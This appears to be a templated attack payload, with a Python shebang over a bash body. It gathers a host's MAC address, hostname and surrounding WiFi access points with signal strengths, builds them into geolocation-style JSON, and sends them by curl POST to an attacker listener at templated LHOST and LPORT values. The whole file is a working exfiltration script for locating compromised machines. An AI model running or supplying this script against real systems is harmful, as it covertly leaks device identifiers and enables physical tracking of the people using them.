#!/usr/bin/python3

#NOTE: The interface name used is a generic wlan0, but sometimes other
#interfaces have to be used (e.g. eth0, lo)
LHOST="{{ LHOST }}"
LPORT="{{ LPORT }}"
{% raw %}


get_signal_info() {
  local iw_output="$1"
  local mac_address="$2"
  local signal_strength=$(echo "$iw_output" | grep -A3 "$mac_address" | grep "Signal level" | awk '{print $3}' | sed 's/level=//')

  echo "{"
  echo "  \"macAddress\": \"$mac_address\","
  echo "  \"signalStrength\": $signal_strength,"
  echo "  \"signalToNoiseRatio\": 0"
  echo "}"
}


mac_address=$(ip link show wlan0 | awk '/ether/ {print $2}' | head -n 1) #Check interface name

device_name=$(hostname)

iwlist_output=$(iwlist wlan0 scan) #Check interface name


networks=($(echo "$iwlist_output" | grep "Address:" | awk '{print $5}'))


wifi_access_points=()

for network in "${networks[@]}"; do
  wifi_access_points+=("$(get_signal_info "$iwlist_output" "$network")")
done


user_info="{"
user_info+="  \"mac\": \"$mac_address\","
user_info+="  \"device\": \"$device_name\","
user_info+="  \"wifi_data\": {"
user_info+="    \"considerIp\": \"false\","
user_info+="    \"wifiAccessPoints\": ["

for ((i=0; i<${#wifi_access_points[@]}; i++)); do
  user_info+="${wifi_access_points[i]}"
  if [ $i -lt $(( ${#wifi_access_points[@]} - 1 )) ]; then
    user_info+=", "
  fi
done

user_info+="    ]"
user_info+="  }"
user_info+="}"
{% endraw %}

curl -X POST "http://$LHOST:$LPORT/listener" -H "Content-Type: application/json" -d "$user_info"